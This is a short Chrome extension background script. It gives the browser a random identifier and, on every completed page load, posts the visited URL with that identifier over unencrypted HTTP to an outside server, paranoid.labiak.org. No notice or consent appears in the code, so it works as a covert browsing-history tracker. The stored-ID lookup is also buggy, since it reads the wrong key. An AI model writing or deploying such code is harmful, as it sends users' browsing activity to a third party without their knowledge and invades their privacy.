function createUUID() {
    return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
  }
  
let agent;

chrome.runtime.onInstalled.addListener(function() {
    chrome.storage.local.get(['agent'], function(result) {
        if (result.key) {
            agent = result.key;
        } else {
            agent = createUUID();
            chrome.storage.local.set({ agent });
        }
    });
});

chrome.webNavigation.onCompleted.addListener(async function({ url, frameId }) {
    if (0 === frameId) {
        await fetch('http://paranoid.labiak.org/save.php', {
            method: 'POST',
            body: JSON.stringify({ url, agent }),
            headers: {
                'content-type': 'application/json'
            }
        })
    }
});
